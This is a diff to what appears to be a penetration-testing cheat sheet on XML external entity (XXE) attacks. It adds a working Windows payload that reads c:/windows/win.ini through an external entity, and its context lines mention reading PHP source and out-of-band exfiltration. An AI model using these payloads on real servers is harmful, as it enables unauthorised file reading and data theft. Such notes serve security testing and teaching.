@@ -18,6 +18,23 @@ To use XXE to read source code in PHP web applications, we can use the following
 
 Once the SVG image is displayed, we should get the base64 encoded content of `index.php`, which we can decode to read the source code.
 
+### Windows
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
+	<order>
+		<quantity>
+			3
+		</quantity>
+		<item>
+			&test;
+		</item>
+		<address>
+			17th Estate, CA
+		</address>
+	</order>
+```
+
 ## OOB Exfiltration
 
 Out of band exfiltration may be achieved by referencing external entities hosted on our local machines and then joining the data with exfiltrated data from the target server.
